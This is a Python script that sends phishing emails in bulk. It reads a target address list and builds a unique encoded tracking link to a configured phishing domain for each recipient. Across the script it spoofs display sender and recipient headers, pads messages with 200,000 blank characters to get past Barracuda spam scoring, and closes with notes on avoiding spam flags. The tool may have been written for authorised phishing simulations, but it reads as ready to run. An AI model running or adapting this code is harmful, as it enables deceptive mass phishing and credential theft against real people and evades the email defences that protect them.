import base64
import ConfigParser
import csv
import datetime
import os
import random
import smtplib
import string
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Set filenames
outputFilesDirectory = "logs"
configFileName = "config.ini"
messageHtmlFileName = "messageHtml.txt"
messagePlainFileName = "messagePlain.txt"
emailListFileName = "emailAddresses.txt"
campaignDetailsFileName = outputFilesDirectory + "/" + "Campaign.csv"
sentEmailsDetailsFileName = outputFilesDirectory + "/" + "SentEmails.csv"

# Check if the output directory does not exist
if not os.path.exists(outputFilesDirectory):

        # Create the output directory
        os.makedirs(outputFilesDirectory)

# Open the log files
campaignDetailsFile = open(campaignDetailsFileName, "w")
sentEmailsDetailsFile = open(sentEmailsDetailsFileName, "w")

# Print the start time
startTime = datetime.datetime.now().strftime("%m-%d-%y %H:%M:%S")
print("Start - " + startTime)

##### Config - Start #####

config = ConfigParser.ConfigParser()
config.read(configFileName)

_useAuthentication = config.get("Settings", "use_authentication")
_username = config.get("Settings", "username")
_password = config.get("Settings", "password")

_date = config.get("Settings", "date")
_mailServer = config.get("Settings", "mail_server")
_port = int(config.get("Settings", "port"))

_from = config.get("Settings", "from")
_subject = config.get("Settings", "subject")
_messageIdDomain = config.get("Settings", "message_id_domain")
_replyTo = config.get("Settings", "reply_to")
_priority = config.get("Settings", "priority")

_displayFrom = config.get("Settings", "display_from")
_displayTo = config.get("Settings", "display_to")

_displayToSameAsActualTo = config.get("Settings", "display_to_same_as_actual_to")

_phishingDomain = config.get("Settings", "phishing_domain")
_tokenForLogParsing = config.get("Settings", "token_for_log_parsing")

_htmlOnly = config.get("Settings", "html_only")

_bypassSpamWithSize = config.get("Settings", "bypass_spam_with_size")

_encrypt = config.get("Settings", "encrypt")
_encode = config.get("Settings", "encode")

_alphabet = config.get("Settings", "alphabet")
_encoding = config.get("Settings", "encoding")

_excludeDomainFromEncryptAndEncode = config.get("Settings", "exclude_domain_from_encrypt_and_encode")

##### Config - End #####

# Create the campaign details file
campaignDetailsFileHeader = "From" + "," + "Display From" + "," + "Display To" + "," + "Reply To" + "," + "Subject" + "," + "Message Id Domain" + "," + "Phishing Domain" + "," + "Token" + "," + "Start" + "," + "End"
campaignDetails = '"' + _from + '","' + _displayFrom + '","' + _displayTo + '","' + _replyTo + '","' + _subject + '","' + _messageIdDomain + '","' + _phishingDomain + '","' + _tokenForLogParsing + '","' + startTime + '","'
campaignDetailsFile.write(campaignDetailsFileHeader + "\n")
campaignDetailsFile.write(campaignDetails)

# Create the email details file
sentEmailsDetailsHeader = "Timestamp" + "," + "To" + "," + "Message Id" + "," + "Unique Link Id" + "," + "Encrypted Unique Link Id" + "," + "Encoded Encrypted Unique Link Id" + "," + "Unique Link"
sentEmailsDetailsFile.write(sentEmailsDetailsHeader + "\n")

# Get the email message
message = open(messageHtmlFileName, "r").read()

# Barracuda's Negative Spam Scoring (>= 150kb)
# https://www.barracuda.com/support/knowledgebase/50160000000HYDfAAO

# Check if bypassing spam by creating a large email
if(_bypassSpamWithSize == "True"):

        # Create many spaces to create a large email which will bypass spam checks
        message = message + "<style>" + " " * 200000 + "</style>"

# Get the total number of email addresses
emailAddressesListCount = sum(1 for line in open(emailListFileName))

# Set the email address count
emailAddressCount = 0

# Read in the list of email addresses
emailAddressesList = open(emailListFileName, "r").read().splitlines()

# Loop through the email addresses
for emailAddress in emailAddressesList:

        # Increment the email address count
        emailAddressCount += 1

        # Print the status
        print(str(int(float(emailAddressCount)/float(emailAddressesListCount)*100)) + "% " + str(emailAddressCount) + "/" + str(emailAddressesListCount) + " " + emailAddress)

        ##### Unique Link - Start #####

        # Check if splitting the email before the "@" symbol
        if(_excludeDomainFromEncryptAndEncode == "True"):

                # Set the unique ID to the local-part of the email address
                uniqueLinkId = emailAddress.split("@", 2)[0]

        # Not splitting the email before the "@" symbol
        else:

                # Set the unique ID to the entire email address
                uniqueLinkId = emailAddress

        # Check if encrypting the unique ID
        if(_encrypt == "True"):

                # Encrypt the unique ID
                transTable = string.maketrans(_alphabet, _encoding)
                encryptedUniqueLinkId = uniqueLinkId.translate(transTable)

        # Not encrypting the unique ID
        else:
                encryptedUniqueLinkId = uniqueLinkId

        # Check if encoding the unique ID
        if(_encode == "True"):

                # Base64 encode the ID
                encodedEncryptedUniqueLinkId = base64.urlsafe_b64encode(encryptedUniqueLinkId)

                # Remove any equal signs
                encodedEncryptedUniqueLinkId = encodedEncryptedUniqueLinkId.replace("=", "")

        # Not encoding the unique ID
        else:
                encodedEncryptedUniqueLinkId = encryptedUniqueLinkId

        ##### Unique Link - End #####

        ##### Add Unique Link - Start #####

        # Create a temporary copy of the message to replace links
        tempHtmlMessage = message

        # Add the phishing domain and tracking ID
        tempHtmlMessage = tempHtmlMessage.replace("phishing_domain", _phishingDomain)
        tempHtmlMessage = tempHtmlMessage.replace("tracking_id", _tokenForLogParsing + encodedEncryptedUniqueLinkId)

        ##### Add Unique Link - End #####

        ##### Message - Start #####

        # Create the message
        msg = MIMEMultipart('alternative')
        msgHtml = MIMEText(tempHtmlMessage, 'html')
        msg.attach(msgHtml)

        # Check if including plain text and html versions to lower the spam score
        if(_htmlOnly != "True"):

                # Get the plain text email message
                tempPlainMessage = open(messagePlainFileName, "r").read()

                # Add the phishing domain and tracking ID
                tempPlainMessage = tempPlainMessage.replace("phishing_domain", _phishingDomain)
                tempPlainMessage = tempPlainMessage.replace("tracking_id", _tokenForLogParsing + encodedEncryptedUniqueLinkId)
        
                # Add the plain text
                msgPlain = MIMEText(tempPlainMessage, 'plain')
                msg.attach(msgPlain)

        # Create an ID for the message
        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        randomNumberForString1 = random.randint(1, 2)
        randomNumberForString2 = random.randint(3, 6)
        randomNumberForString3 = random.randint(2, 5)
        randomString1 = "".join(random.choice(alphabet) for x in range(randomNumberForString1))
        randomString2 = "".join(random.choice(alphabet) for x in range(randomNumberForString2))
        randomString3 = "".join(random.choice(alphabet) for x in range(randomNumberForString3))
        randomNumber1 = str(random.randint(0, 10000))
        randomNumber2 = str(random.randint(0, 10000))
        randomNumber3 = str(random.randint(0, 10000))

        # Create the unique message ID
        messageId = "<" + randomString1 + randomNumber1 + randomString2 + randomNumber2 + randomString3 + randomNumber3 + "@" + _messageIdDomain + ">"

        # Set email headers
        msg['Date'] = _date # MUST BE WITHIN THE PAST/FUTURE 3 HOURS 
        msg['From'] = _displayFrom
        msg['Subject'] = _subject
        msg['Message-ID'] = messageId
        msg['Reply-To'] = _replyTo
        
        # Check if the display to is the same as the actual to
        if(_displayToSameAsActualTo == "True"):

                # Set the display to
                msg['To'] = emailAddress

        # Display to is spoofed
        else:
                
                # Set the spoofed display to
                msg['To'] = _displayTo

        # Check if normal priority
        if(_priority == "Normal"):
                msg['X-Priority'] = "3"

        # Check if high priority
        elif(_priority == "High"):
                msg['X-Priority'] = "1"
                msg['X-MSMail-Priority'] = "High"
                msg['Importance'] = "High"

        # Check if low priority
        elif(_priority == "Low"):
                msg['X-Priority'] = "5"

        # Default priority of normal
        else:
                msg['X-Priority'] = "3"

        ##### Message - End #####

        ##### Send Email - Start #####

        # Check if using authentication
        if(_useAuthentication == "True"):

                # Try to authenticate
                try:
                        # Send the email
                        smtpObj = smtplib.SMTP_SSL(_mailServer, _port)
                        smtpObj.ehlo()
                        smtpObj.login(_username, _password)
                        smtpObj.sendmail(_from, emailAddress, msg.as_string())

                # Unable to authenticate
                except:
                        print("Unable to authenticate. Target: " + emailAddress)

        # Not using authentication
        else:

                # Send the email
                smtpObj = smtplib.SMTP(_mailServer)
                smtpObj.sendmail(_from, emailAddress, msg.as_string())
                smtpObj.quit()

        ##### Send Email - End #####

        # Log the details
        sentEmailsDetails = datetime.datetime.now().strftime("%m-%d-%y %H:%M:%S") + "," + emailAddress + "," + messageId + "," + uniqueLinkId + "," + encryptedUniqueLinkId + "," + encodedEncryptedUniqueLinkId + "," + (_phishingDomain + "/" + _tokenForLogParsing + encodedEncryptedUniqueLinkId)
        sentEmailsDetailsFile.write(sentEmailsDetails + "\n")

# Get the end time
endTime = datetime.datetime.now().strftime("%m-%d-%y %H:%M:%S")

# Print the end time
print("End - " + endTime)

# Write the end time
campaignDetailsFile.write(endTime + '"')

# Close the log files
campaignDetailsFile.close()
sentEmailsDetailsFile.close()

# Notes to avoid getting flagged as spam:
# Date or Message-ID must be different
# Large font size can raise the score
# Mismatched to/from can raise the score
# Use html and plain text to get rid of "MIME_HTML_ONLY". The html and plain text must match
